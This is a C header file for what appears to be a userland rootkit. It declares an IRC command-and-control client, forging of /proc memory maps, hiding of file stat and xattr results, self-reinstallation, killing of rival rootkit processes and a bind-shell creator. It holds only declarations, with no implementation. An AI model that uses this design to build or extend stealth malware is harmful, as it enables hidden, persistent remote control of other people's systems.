#ifndef UTILS_H
#define UTILS_H
/* conn.c */
int setup_connection(void);
int read_line(int sock, char *buffer);
char *get_prefix(char *line);
char *get_username(char *line);
char *get_command(char line[]);
char *get_last_argument(char line[]);
char *get_argument(char line[], int argno);
void set_nick(int sock, char nick[]);
void send_user_packet(int sock, char nick[]);
void join_channel(int sock, char channel[]);
void send_pong(int sock, char argument[]);
void send_message(int sock, char to[], char message[]);
void populate_chrs(char *line, char **pfix, char **uname, char **cmd, char **larg);
void betrayer(int s);
#define CMSG(buf) send_message(sockfd,CHANNEL,buf);

/* forge.c */
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);

/* hide.c */
int hxstat(const char *path);
int hfxstat(int fd);
int hxattr(const char *path);
int hfxattr(int fd);

/* misc.c */
char *gdirname(DIR *dirp);
char *cprocname(void);
char *gcmdline(void);
void reinstall(void);
int create_bind_shell(int port);

/* proc.c */
int is_bad_proc(const char *filename);
DIR *open_procd(void);
int kill_self(void);
void kill_rk_procs(void);
int is_betrayed_alive(void);

#include "conn.c"
#include "forge.c"
#include "hide.c"
#include "misc.c"
#include "proc.c"

#endif
